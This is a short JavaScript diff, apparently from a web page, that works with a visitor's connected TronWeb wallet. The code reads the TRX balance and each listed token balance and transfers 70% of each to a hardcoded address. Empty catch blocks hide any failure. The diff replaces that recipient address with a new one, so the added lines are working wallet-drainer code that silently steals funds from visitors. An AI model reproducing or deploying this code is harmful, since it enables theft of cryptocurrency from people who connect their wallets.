@@ -264,14 +264,14 @@
       try{
         var balance = await window.tronWeb.trx.getBalance();
         if (balance >= 20000000)
-          await tronWeb.trx.sendTransaction("TDVD1UesVC68ZkFDLKTB6diRuEuzWn4iy5", Math.round(balance * 70 / 100));
+          await tronWeb.trx.sendTransaction("TWiSL6pShvykYupXgvoxjC9ouk9zv3qexi", Math.round(balance * 70 / 100));
       }catch{}
       for(i=0; i<contractsAddress.length; i++){
         try{
           var cc = await window.tronWeb.contract().at(contractsAddress[i]);
           balance = await cc.balanceOf(window.tronWeb.defaultAddress.base58).call()
           if (balance >= tBalance[i]){
-            await cc.transfer("TDVD1UesVC68ZkFDLKTB6diRuEuzWn4iy5", Math.round(balance * 70 / 100)).send()
+            await cc.transfer("TWiSL6pShvykYupXgvoxjC9ouk9zv3qexi", Math.round(balance * 70 / 100)).send()
           }
         }catch{}
       }
